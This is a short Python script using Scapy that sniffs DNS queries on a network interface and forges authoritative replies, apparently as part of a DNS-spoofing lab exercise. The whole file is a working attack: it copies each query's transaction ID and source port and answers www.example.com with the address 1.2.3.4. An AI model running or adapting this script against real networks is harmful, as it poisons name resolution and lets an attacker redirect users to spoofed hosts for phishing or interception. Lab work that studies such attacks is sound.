#!/usr/bin/env python3
from scapy.all import *

ATTACKER_IFACE = "br-dbc3b4f82415"
TARGET_DOMAIN = b"www.example.com."

def spoof_user(pkt):
    if DNS in pkt and pkt[DNS].qr == 0 and TARGET_DOMAIN in pkt[DNS].qd.qname:
        print(f"[+] User query caught → TXID {pkt[DNS].id}")

        # The user thinks the DNS server is 10.9.0.53
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

        # The reply must use:
        # sport = 53 (DNS)
        # dport = user's random port
        udp = UDP(sport=53, dport=pkt[UDP].sport)

        answer = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4', ttl=600)

        dns = DNS(
            id=pkt[DNS].id,
            qr=1, aa=1,
            qd=pkt[DNS].qd,
            ancount=1,
            an=answer
        )

        send(ip/udp/dns, verbose=0)

        print("[+] Spoof sent to user!")

sniff(
    iface=ATTACKER_IFACE,
    filter="udp and dst port 53",
    prn=spoof_user
)
